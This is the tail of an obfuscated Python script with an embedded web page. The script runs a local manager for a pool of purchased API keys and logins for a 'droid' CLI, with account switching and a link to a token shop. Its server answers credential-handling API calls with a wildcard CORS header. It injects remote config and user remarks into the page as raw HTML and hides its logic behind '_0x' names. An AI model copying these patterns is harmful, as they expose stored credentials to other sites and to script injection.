                        <button class="btn btn-primary" onclick="addToken()">点击添加</button>
                    </div>
                </div>
                <div class="paste-right">
                    <div class="credits-box">
                        <div class="credits-title">致谢</div>
                        <div id="creditsContent">
                            <div class="credits-item">前端程序员：YO！</div>
                            <div class="credits-item">后端程序员：bingw</div>
                        </div>
                        <div id="announcementBox" style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #44475a; display: none;">
                            <div style="color: #ffb86c; font-size: 12px;" id="announcementText"></div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="info-row">
                <span id="contactInfo">联系作者: haooicq@gmail.com</span>
                <a href="https://pay.ldxp.cn/shop/D4P96006" target="_blank" id="purchaseLink">获取Token: 点击购买</a>
                <span style="color: #6272a4; font-size: 11px; cursor: pointer;" onclick="checkVersion()">🔄 检查更新</span>
            </div>
        </div>
        <div class="card">
            <div class="card-title">当前登录状态</div>
            <div id="loginStatus" class="login-status">检测中...</div>
        </div>
        <div class="card">
            <div class="card-title">账号池</div>
            <div class="toolbar">
                <button class="btn btn-secondary" onclick="loadAccounts()">刷新列表</button>
                <button class="btn btn-primary" onclick="refreshAllBalances()">💰 刷新额度</button>
                <button class="btn btn-success" onclick="syncCurrentLogin()">📥 导入当前登录</button>
            </div>
            <div id="accountList"></div>
        </div>
    </div>
    <div class="modal" id="remarkModal">
        <div class="modal-content">
            <h3 class="modal-title">编辑备注</h3>
            <input type="hidden" id="remarkIndex">
            <textarea id="remarkInput" rows="3" placeholder="输入备注..."></textarea>
            <div class="btn-row">
                <button class="btn btn-primary" onclick="saveRemark()">保存</button>
                <button class="btn btn-secondary" onclick="closeModal()">取消</button>
            </div>
        </div>
    </div>
    <div class="loading" id="loadingOverlay">
        <div class="loading-content">
            <div class="progress-ring">
                <svg width="80" height="80">
                    <circle class="bg" cx="40" cy="40" r="34"></circle>
                    <circle class="progress" id="progressCircle" cx="40" cy="40" r="34" stroke-dasharray="213.6" stroke-dashoffset="213.6"></circle>
                </svg>
                <div class="progress-text" id="progressText">0%</div>
            </div>
            <div class="loading-message" id="loadingMessage">API Key 正在读取中...</div>
        </div>
    </div>
    <script>
        let loadingTimer = null;
        let progressInterval = null;
        let currentTimeout = 30000;
        function showLoading(message = 'API Key 正在读取中...', timeout = 30000) {
            currentTimeout = timeout;
            document.getElementById('loadingMessage').textContent = message;
            document.getElementById('loadingOverlay').classList.add('active');
            setProgress(0);
            let progress = 0;
            const startTime = Date.now();
            if (progressInterval) clearInterval(progressInterval);
            progressInterval = setInterval(() => {
                const elapsed = Date.now() - startTime;
                progress = Math.min(95, (elapsed / currentTimeout) * 100);
                setProgress(progress);
            }, 100);
            if (loadingTimer) clearTimeout(loadingTimer);
            loadingTimer = setTimeout(() => {
                hideLoading();
                showToast('操作超时，请重试', 'error');
            }, currentTimeout);
        }
        function hideLoading() {
            if (loadingTimer) { clearTimeout(loadingTimer); loadingTimer = null; }
            if (progressInterval) { clearInterval(progressInterval); progressInterval = null; }
            setProgress(100);
            setTimeout(() => {
                document.getElementById('loadingOverlay').classList.remove('active');
                setProgress(0);
            }, 200);
        }
        function setProgress(percent) {
            const circle = document.getElementById('progressCircle');
            const text = document.getElementById('progressText');
            const circumference = 213.6;
            const offset = circumference - (percent / 100) * circumference;
            circle.style.strokeDashoffset = offset;
            text.textContent = Math.round(percent) + '%';
        }
        function showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.className = 'toast toast-' + type;
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        function clearInput() { document.getElementById('tokenInput').value = ''; }
        async function api(action, data = {}) {
            const response = await fetch('/api', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action, ...data })
            });
            return response.json();
        }
        async function addToken() {
            const content = document.getElementById('tokenInput').value.trim();
            if (!content) { showToast('请先粘贴 Key', 'error'); return; }
            showLoading('API Key 正在读取中...', 30000);
            const result = await api('add', { content });
            hideLoading();
            if (result.success) {
                showToast(result.message, 'success');
                clearInput();
                loadAccounts();
                if (result.is_first) { showToast('配置完成，可直接使用！', 'success'); }
            } else { showToast(result.message, 'error'); }
        }
        async function loadAccounts() {
            const result = await api('list');
            const container = document.getElementById('accountList');
            if (!result.accounts || result.accounts.length === 0) {
                container.innerHTML = '<div class="empty-state">暂无账号，请添加 Key</div>';
                return;
            }
            let html = '<div class="table-wrapper"><table><thead><tr><th>#</th><th>Key 编号</th><th>状态</th><th>额度状态</th><th>剩余</th><th>使用率</th><th>备注</th><th>添加时间</th><th>操作</th></tr></thead><tbody>';
            for (const acc of result.accounts) {
                const statusClass = 'status-' + acc.status;
                const statusIcon = acc.is_current ? '🟢' : (acc.status === 'valid' ? '✅' : (acc.status === 'refresh' ? '🔄' : '❌'));
                const balanceClass = 'balance-' + acc.balance_status;
                const balanceIcon = (acc.status === 'refresh' && acc.balance_text === '-') ? '' : (acc.balance_status === 'good' ? '🟢' : acc.balance_status === 'medium' ? '🟡' : acc.balance_status === 'low' ? '🔴' : acc.balance_status === 'exhausted' ? '⚠️' : acc.balance_status === 'error' ? '❌' : '⏳');
                const keyDisplay = acc.key_id.startsWith('SF-') && acc.key_id.length > 35 ? acc.key_id.substring(0, 35) + '...' : acc.key_id;
                const cachedTip = acc.cached && acc.last_updated ? ` title="缓存数据，更新于: ${acc.last_updated}"` : '';
                const statusTip = acc.status === 'refresh' ? ' title="服务端已进入节能模式，状态待刷新，额度用完前并不影响使用"' : '';
                const balanceTip = acc.balance_status === 'error' ? ' title="注意：查询失败并不代表key失效，如果key额度高于20%请在几小时后重新查询，在额度使用完之前，此提示并不影响使用"' : cachedTip;
                const refreshRequestBtn = acc.status === 'refresh' ? `<button class="btn-request-refresh" onclick="requestRefresh('${acc.key_id}')" title="向管理员申请刷新此Key">📨 申请刷新</button>` : '';
                html += `<tr><td>${acc.index}</td><td style="font-family: monospace; font-size: 11px;">${refreshRequestBtn}${keyDisplay}</td><td class="${statusClass}"${statusTip}>${statusIcon} ${acc.is_current ? '登录中' : acc.status_text}</td><td class="${balanceClass}"${balanceTip}>${balanceIcon} ${acc.balance_text}</td><td>${acc.remaining}</td><td>${acc.usage_ratio}</td><td>${acc.remark || '-'}</td><td>${acc.added_at}</td><td><button class="btn btn-success action-btn" onclick="switchAccount(${acc.index})">切换</button><button class="btn btn-secondary action-btn" onclick="refreshToken(${acc.index})">刷新</button><button class="btn btn-secondary action-btn" onclick="editRemark(${acc.index}, '${(acc.remark || '').replace(/'/g, "\\\\'")}')">备注</button><button class="btn btn-danger action-btn" onclick="deleteAccount(${acc.index})">删除</button></td></tr>`;
            }
            html += '</tbody></table></div>';
            container.innerHTML = html;
        }
        async function refreshAllBalances() {
            showToast('正在查询所有账号额度...', 'info');
            const result = await api('refresh_balances');
            if (result.success) { showToast('额度查询完成', 'success'); loadAccounts(); }
            else { showToast(result.message || '查询失败', 'error'); }
        }
        async function loadLoginStatus() {
            const container = document.getElementById('loginStatus');
            try {
                const result = await api('login_info');
                if (result.success && result.info) {
                    const info = result.info;
                    // 如果已同步到账号池，即使过期也显示"已同步，状态待更新"
                    let statusBadge;
                    if (info.in_pool && info.expired) {
                        statusBadge = '<span class="status-badge badge-synced">已同步，状态待更新</span>';
                    } else if (info.expired) {
                        statusBadge = '<span class="status-badge badge-expired">已过期</span>';
                    } else {
                        statusBadge = '<span class="status-badge badge-active">有效</span>';
                    }
                    const syncBadge = info.in_pool ? '<span class="status-badge badge-synced">已同步</span>' : '<span class="status-badge badge-none">未同步</span>';
                    let userDisplay = info.sf_key_line1 || info.email || (info.sub ? `用户ID: ${info.sub.substring(0, 12)}...` : '未知用户');
                    if (userDisplay.startsWith('SF-') && userDisplay.length > 35) userDisplay = userDisplay.substring(0, 35) + '...';
                    container.innerHTML = `<div class="status-row"><div class="user-info"><span style="font-family: monospace; font-size: 12px;">🔐 ${userDisplay}</span>${statusBadge}${info.in_pool ? '' : syncBadge}</div>${!info.in_pool ? '<button class="btn btn-success" onclick="syncCurrentLogin()">📥 导入到账号池</button>' : ''}</div>`;
                } else { container.innerHTML = '<span style="color: #6272a4;">❌ 未检测到登录账号（请先运行 droid auth login）</span>'; }
            } catch (e) { container.innerHTML = '<span style="color: #ff5555;">检测失败</span>'; }
        }
        async function syncCurrentLogin() {
            showToast('正在导入当前登录账号...', 'info');
            const result = await api('sync_login');
            if (result.synced) { showToast(result.message, 'success'); loadAccounts(); loadLoginStatus(); setTimeout(() => refreshAllBalances(), 1000); }
            else if (result.exists) { showToast('账号已在池中', 'info'); }
            else { showToast(result.message || '导入失败', 'error'); }
        }
        async function switchAccount(index) {
            showLoading('正在切换账号...', 20000);
            const result = await api('switch', { index });
            hideLoading();
            showToast(result.message, result.success ? 'success' : 'error');
            if (result.success) loadAccounts();
        }
        async function deleteAccount(index) {
            if (!confirm('确定要删除这个账号吗？')) return;
            const result = await api('delete', { index });
            showToast(result.message, result.success ? 'success' : 'error');
            if (result.success) loadAccounts();
        }
        async function refreshToken(index) {
            showToast('正在刷新...', 'info');
            const result = await api('refresh', { index });
            showToast(result.message, result.success ? 'success' : 'error');
            if (result.success) loadAccounts();
        }
        function editRemark(index, currentRemark) {
            document.getElementById('remarkIndex').value = index;
            document.getElementById('remarkInput').value = currentRemark;
            document.getElementById('remarkModal').classList.add('active');
        }
        function closeModal() { document.getElementById('remarkModal').classList.remove('active'); }
        async function saveRemark() {
            const index = parseInt(document.getElementById('remarkIndex').value);
            const remark = document.getElementById('remarkInput').value.trim();
            const result = await api('remark', { index, remark });
            showToast(result.message, result.success ? 'success' : 'error');
            if (result.success) { closeModal(); loadAccounts(); }
        }
        async function requestRefresh(keyId) {
            if (!confirm('确定要向管理员申请刷新此Key吗？\\n管理员会在看到请求后尽快处理。')) return;
            showToast('正在提交申请...', 'info');
            const result = await api('request_refresh', { key_id: keyId });
            showToast(result.message, result.success ? 'success' : 'error');
        }
        loadAccounts();
        loadLoginStatus();
        loadCloudConfig();
        let autoRefreshTimer = null;
        async function autoRefreshBalances() { await api('refresh_balances'); loadAccounts(); loadLoginStatus(); }
        function startAutoRefresh() { setTimeout(async () => { await autoRefreshBalances(); autoRefreshTimer = setInterval(autoRefreshBalances, 60000); }, 3000); }
        startAutoRefresh();
        
        async function loadCloudConfig() {
            try {
                const result = await api('cloud_config');
                if (result.success && result.config) {
                    updateUIConfig(result.config);
                }
            } catch (e) {}
        }
        
        function updateUIConfig(config) {
            // 更新致谢列表
            if (config.credits && config.credits.length > 0) {
                const creditsHtml = config.credits.map(c => 
                    `<div class="credits-item">${c.role}：${c.name}</div>`
                ).join('');
                document.getElementById('creditsContent').innerHTML = creditsHtml;
            }
            // 更新购买链接
            if (config.purchase_text) {
                const link = document.getElementById('purchaseLink');
                const url = config.purchase_url || '';
                // 如果有有效链接则显示为链接，否则显示为普通文本
                if (url && url.length > 10 && url !== 'https://...' && url !== 'https://') {
                    link.href = url;
                    link.style.cursor = 'pointer';
                } else {
                    link.removeAttribute('href');
                    link.style.cursor = 'default';
                }
                link.textContent = config.purchase_text;
            }
            // 更新联系方式
            if (config.contact) {
                document.getElementById('contactInfo').textContent = '联系作者: ' + config.contact;
            }
            // 更新公告
            if (config.announcement) {
                document.getElementById('announcementText').textContent = config.announcement;
                document.getElementById('announcementBox').style.display = 'block';
            }
        }
        
        async function checkVersion() {
            showToast('检查更新中...', 'info');
            try {
                const result = await api('check_version');
                if (result.success && result.version) {
                    const v = result.version;
                    const msg = `当前版本: ${v.current || '1.0.0'}\\n\\n更新日志:\\n${v.changelog || '无'}`;
                    if (confirm(msg + '\\n\\n点击确定下载最新版本')) {
                        window.open(v.download_url || 'https://github.com/shone2025/shone-factory/releases/latest', '_blank');
                    }
                } else {
                    showToast('已是最新版本', 'success');
                }
            } catch (e) {
                showToast('检查更新失败', 'error');
            }
        }
    </script>
</body>
</html>
'''

class _0xRH(BaseHTTPRequestHandler):
    _0m=_0xTM()
    def log_message(s,f,*a):pass
    def _0xsj(s,d,st=200):
        s.send_response(st);s.send_header('Content-Type','application/json; charset=utf-8');s.send_header('Access-Control-Allow-Origin','*');s.end_headers()
        s.wfile.write(json.dumps(d,ensure_ascii=False).encode('utf-8'))
    def _0xsh(s,h):
        s.send_response(200);s.send_header('Content-Type','text/html; charset=utf-8');s.end_headers();s.wfile.write(h.encode('utf-8'))
    def do_GET(s):
        _0xCHK()
        if s.path=='/'or s.path=='/index.html':s._0xsh(_H1)
        else:s.send_response(404);s.end_headers()
    def do_POST(s):
        _0xCHK()
        if s.path=='/api':
            cl=int(s.headers.get('Content-Length',0));bd=s.rfile.read(cl).decode('utf-8')
            try:
                d=json.loads(bd);ac=d.get('action','')
                if ac=='add':r=s._0m._0xat(d.get('content',''))
                elif ac=='list':r={"accounts":s._0m._0xgal()}
                elif ac=='switch':r=s._0m._0xswa(d.get('index',0))
                elif ac=='delete':r=s._0m._0xda(d.get('index',0))
                elif ac=='remark':r=s._0m._0xur(d.get('index',0),d.get('remark',''))
                elif ac=='refresh':r=s._0m._0xrsa(d.get('index',0))
                elif ac=='refresh_balances':s._0m._0xrab();r={"success":True,"message":"额度查询完成"}
                elif ac=='sync_login':r=s._0m._0xscl()
                elif ac=='login_info':i=s._0m._0xgcli();r={"success":True,"info":i}
                elif ac=='cloud_config':c=_0xGCF();r={"success":True,"config":c}if c else{"success":False}
                elif ac=='check_version':r=_0xGVR()
                elif ac=='request_refresh':r=_0xRRF(d.get('key_id',''))
                else:r={"success":False,"message":"未知操作"}
                s._0xsj(r)
            except Exception as e:s._0xsj({"success":False,"message":str(e)},500)
        else:s.send_response(404);s.end_headers()

def _0xM():
    _0xCHK()
    print("="*50)
    print("  ShoneFactory Token Key - Web 版")
    print("="*50)
    print()
    sv=HTTPServer((_H0,_P0),_0xRH);url=f"http://{_H0}:{_P0}"
    print(f"  服务已启动: {url}")
    print();print("  正在打开浏览器...");print();print("  按 Ctrl+C 停止服务");print()
    def _ob():webbrowser.open(url)
    threading.Timer(0.5,_ob).start()
    try:sv.serve_forever()
    except KeyboardInterrupt:print("\n  服务已停止");sv.shutdown()

if __name__=='__main__':
    _0xCHK()
    _0xM()
